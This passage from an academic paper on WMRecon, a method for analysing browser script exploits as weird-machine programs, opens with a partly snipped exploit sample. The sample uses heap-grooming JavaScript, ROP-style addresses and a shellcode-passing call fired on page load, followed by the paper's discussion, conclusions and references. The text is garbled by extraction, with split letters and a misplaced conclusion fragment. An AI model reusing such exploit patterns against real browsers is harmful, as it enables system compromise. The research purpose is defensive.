+34
+35 s etM a r k e r ( ’ p r e p a r e ’ ) ;
+36 / / p r e p a r e : : memalloc +memfree+memfree+memalloc . . . SNIP . . .
+37 / / [ I n f o : 6KB+6KB+12KB+25KB]
+38 p = u n e s c a p e (”% u5770%u466b ” ) ;
+39 f o r ( i = 0; i < 3 ; i ++ ) {
+40 p += u n e s c a p e (”% u5770%u466b ” ) ;
+41 }
+42 p += u n e s c a p e (”% ub860 . . . SNIP . . . ” ) ;
+43
+44 f o = u n e s c a p e (”% ud801%u77c4 ” ) ;
+45 f o r ( i = 0; i < 5 5; i ++ ) {
+46 i f ( i == 5 4 ) { f o += u n e s c a p e (”% u5ed5%u77c1 ” ) ; }
+47 e l s e { f o += u n e s c a p e (”% ud801%u77c4 ” ) ; }
+48 }
+49
+50 f o += p ;
+51
+52 s etM a r k e r ( ’ mstime ’ ) ;
+53 / / mstime : : memalloc +memfree . . . SNIP . . . \ \
+54 + c a l l S t a c k R e p l a c e + . . . SNIP . . . + e x e c C r a f t e d
+55 / / [ I n f o : 118KB+118KB . . . SNIP . . . \ \
+56 +0 x 0 4 6ae 0 4c + . . . SNIP . . . + 0 x 0 4 6ae 1a d ]
+57 m stim e m all o c ({ s h e l l c o d e : fo , h e a pBl o c k Si z e : 0 x58 ,\\
+58 o b j I d : ” myanim ” } ) ;
+59 }
+60 </ s c r i p t >
+61 </head>
+62
+63 <body o nl o a d =” e v a l ( h ell oW o rl d ( ) )” >
+64 <t :ANIMATECOLOR i d =”myanim”/>
+65 <di v i d =” di v elm”></di v>
+66 <fo rm i d =” fo rmelm”>
+67 </form>
+68 </body>
+69 </ html>
+V. DISCUSSION AND RESEARCH DIRECTION
+Results obtained from the case studies demonstrate promise
+for the feasibility of approaching exploit analysis through WM
+reconstruction. In particular the 4 primitives, along with the
+process followed for defining them, show how exploit primitives can be defined in the manner required by the WMRecon
+algorithm. Despite the case studies being based on relatively
+less recent exploits and targets, mandated by the elevated
+sophistication of the more recent ones, they nonetheless attain
+their intent of demonstrating the end-to-end applicability of the
+idea being proposed and therefore augur favourably towards
+further exploration in this direction. Definitely, one important
+outcome is the crucial requirement that tools implementing
+WMRecon should be able to accurately detect and monitor
+custom application-level memory managers. Substantial effort
+has already been devoted towards this endeavour in previous
+work with significant success [16], and therefore a solid
+starting point is already in place.
+Only once this aspect has been dealt with can research
+proceed to cover more sophisticated/recent exploits as case
+studies. In particular, we are after exploits that leverage multiple features and vulnerabilities from their targets, possibly
+combining different parsing modules and script engines of the
+same web browser within individual steps of the same exploit.
+One specific example5
+leverages an ActionScript engine’s
+5https://blog.fortinet.com/2014/05/27/a-technical-analysis-of-cve-2014-
+1776
+deterministic memory layout combined with a JavaScriptaccessible browser vulnerability to be able to bypass ASLRrandomized heaps by leaking memory content. A separate
+memory error in the ActionScript engine is then used to subvert execution, switching off DEP using ROP in the process.
+Reconstructing WMs from exploits having a similar level of
+sophistication entails defining further exploit primitives, e.g.
+attacker-controlled memory reads, as well as being able to
+separate the program memory state transitions of different
+application threads during dynamic binary analysis.
+In the longer term the followed up idea should also cater for:
+assisting analysts during the marker placement process; script
+de-obfuscation specifically targeted for aiding exploit analysis;
+non-web browser script exploit case studies; as well as kernel
+exploit case studies. With respect to the latter research avenue
+it is interesting to note that kernel exploits are similar to
+script exploits, in the sense that, while script exploits utilize
+primitives to access native-level operations from the scriptlevel, likewise kernel exploits access kernel-level operations
+from user-level.
+VI. CONCLUSIONS
+In this paper we tackled the problem of the ever-increasing
+difficulty of analysing script exploits due to their increased
+sophistication. The approach taken was to cast the exploit
+analysis problem as a Weird Machine (WM) reconstruction
+problem, that aims to identify those script statements being
+used as exploit primitives in order to take advantage of
+emergent functionality inside target applications constituting
+a WM, and of which they are valid bytecode. This novel idea
+As explained at length in this paper, analysis of script
+exploits has nothing to do with the superficial semantics of
+script statements, rather it has all to do with the program
+memory-level (native) operations that they aim to attain in
+their quest to program the WM. In-line with this concept,
+we presented WMRecon, a WM reconstruction algorithm that
+takes a dynamic binary analysis approach in order to detect
+behaviour caused by exploit primitives and associating it with
+the responsible script statements. These constitute valid WM
+bytecode while the associated exploit primitive behaviours
+provide the corresponding semantics. The reconstructed WM
+is none other than this identified bytecode set. Experimentation
+with exploit samples of moderate sophistication demonstrates
+the feasibility of this approach. At the same time results
+also point towards the crucial requirement of enhancing the
+current prototype with the capability to detect and monitor
+customer memory managers, before it can handle exploits
+with an elevated level of sophistication. In particular we are
+aiming for exploits that combine multiple script languages and
+eventually to also consider adding kernel exploits within scope.
+proposes that exploit analysts can benefit from the automated
+identification of individual exploit steps while only being
+required to be knowledgeable of exploit programming in
+general. Therefore, they can do away with having to learn
+the in-depth details of a multitude of web browser and script
+engine implementations.
+REFERENCES
+[1] Marco Cova, Christopher Kruegel, and Giovanni Vigna. Detection and
+analysis of drive-by-download attacks and malicious javascript code. In
+Proceedings of the 19th international conference on World Wide Web,
+pages 281–290. ACM, 2010.
+[2] Corelan. Heap spraying demystified. https://www.corelan.be/index.php/
+articles/ [Accessed: 03/04/2017].
+[3] Sergey Bratus, Michael E Locasto, Meredith L Patterson, Len Sassaman,
+and Anna Shubina. Exploit programming: From buffer overflows to
+weird machines and theory of computation. USENIX; login, 36(6), 2011.
+[4] MS IE security vulnerabilities. https://www.cvedetails.
+com/vulnerability-list/vendor id-26/ product id-9900/
+Microsoft-Internet-Explorer.html [Accessed: 03/05/2017].
+[5] Len Sassaman, Meredith L Patterson, and Sergey Bratus. A patch for
+postel’s robustness principle. IEEE Security & Privacy, 10(2):87–91,
+2012.
+[6] Julian Bangert, Sergey Bratus, Rebecca Shapiro, and Sean W Smith.
+The page-fault weird machine: Lessons in instruction-less computation.
+In WOOT, 2013.
+[7] Windows 10 mitigation improvements. https://www.blackhat.com/ docs/
+us-16/materials/ us-16-Weston-Windows-10-Mitigation-Improvements.
+pdf [Accessed: 03/04/2017].
+[8] Trend Micro. A look into Adobe Flash Player CVE-2016-1019 zero-day
+attack. http:// blog.trendmicro.com/trendlabs-security-intelligence/
+look-adobe-flash-player-cve-2016-1019-zero-day-vulnerability/
+[Accessed: 03/04/2017].
+[9] Andreas Moser, Christopher Kruegel, and Engin Kirda. Exploring
+multiple execution paths for malware analysis. In Security and Privacy,
+2007. SP’07. IEEE Symposium on, pages 231–245. IEEE, 2007.
+[10] Dawn Song, David Brumley, Heng Yin, Juan Caballero, Ivan
+Jager, Min Gyung Kang, Zhenkai Liang, James Newsome, Pongsin
+Poosankam, and Prateek Saxena. BitBlaze: A new approach to computer
+security via binary analysis. In International Conference on Information
+Systems Security, pages 1–25. Springer, 2008.
+[11] Sang Kil Cha, Thanassis Avgerinos, Alexandre Rebert, and David
+Brumley. Unleashing Mayhem on binary code. In Security and Privacy
+(SP), 2012 IEEE Symposium on, pages 380–394. IEEE, 2012.
+[12] Yanzhen Qu and Kelly Hughes. Detecting metamorphic malware
+by using behavior-based aggregated signature. In Internet Security
+(WorldCIS), 2013 World Congress on, pages 13–18. IEEE, 2013.
+[13] Xunchao Hu, Aravind Prakash, Jinghan Wang, Rundong Zhou, Yao
+Cheng, and Heng Yin. Semantics-preserving dissection of javascript
+exploits via dynamic js-binary analysis. In International Symposium on
+Research in Attacks, Intrusions, and Defenses, pages 254–276. Springer,
+2016.
+[14] Fermin Serna. The info leak era on software exploitation.
+https://media.blackhat.com/ bh-us-12/Briefings/ Serna/BH US 12
+Serna Leak Era Slides.pdf [Accessed: 03/04/2017].
+[15] Stephen Bradshaw. Heap spray exploit tutorial: Internet Explorer Use
+After Free Aurora vulnerability. http://www.thegreycorner.com/ 2010/
+01/ heap-spray-exploit-tutorial-internet.html[Accessed:03/ 04/ 2017].
+[16] Xi Chen, Asia Slowinska, and Herbert Bos. MemBrush: A practical
+tool to detect custom memory allocators in C binaries. In Reverse
+Engineering (WCRE), 2013 20th Working Conference on, pages 477–
+478. IEEE, 2013.
